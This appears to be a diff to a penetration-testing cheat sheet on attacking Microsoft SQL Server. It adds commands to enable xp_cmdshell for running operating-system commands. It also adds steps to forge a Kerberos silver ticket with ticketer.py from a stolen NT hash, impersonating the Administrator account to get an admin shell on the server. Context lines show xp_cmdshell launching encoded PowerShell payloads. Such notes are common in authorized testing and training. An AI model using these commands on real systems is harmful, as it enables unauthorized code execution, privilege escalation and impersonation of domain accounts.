@@ -22,6 +22,8 @@ impacket-mssqlclient  -windows-auth $Domain/$user:'$pass'@Domain
 impacket-mssqlclient $full_Domain/$user:'$pass'@Domain
 
 mssqlclient.py $Domain/$user:$passwd@$Ip -windows-auth
+
+mssqlclient.py -k -no-pass $Full_Domain
 ```
 ### Comman usage
 ```bash
@@ -42,6 +44,15 @@ select name from sys.tables;    #show tables
 select * from <table_name>;     #show content 
 
 SELECT * FROM INFORMATION_SCHEMA.TABLES;
+```
+## Enable xp_cmdshell
+```bash
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+EXEC xp_cmdshell 'whoami';
 ```
 
 ## Common Check's
@@ -134,6 +145,17 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;                                          
 exec xp_cmdshell 'whoami'                             
 exec xp_cmdshell 'powershell -enc <encoded_raw_code>' 
+```
+# Forge Ticket
+We are forging ticket to get the administrator shell in the mssql server. so we can run xp_cmdshell.
+```bash
+ticketer.py -nthash $nthash -domain-sid $sid -domain $Domain -spn $user/$Full_DOmain:$Port -groups 1105 -user-id 500 Administrator
+```
+```bash
+export KRB5CCNAME=Administrator.ccache
+klist
+
+mssqlclient.py -k -no-pass $Full_Domain
 ```
 
 
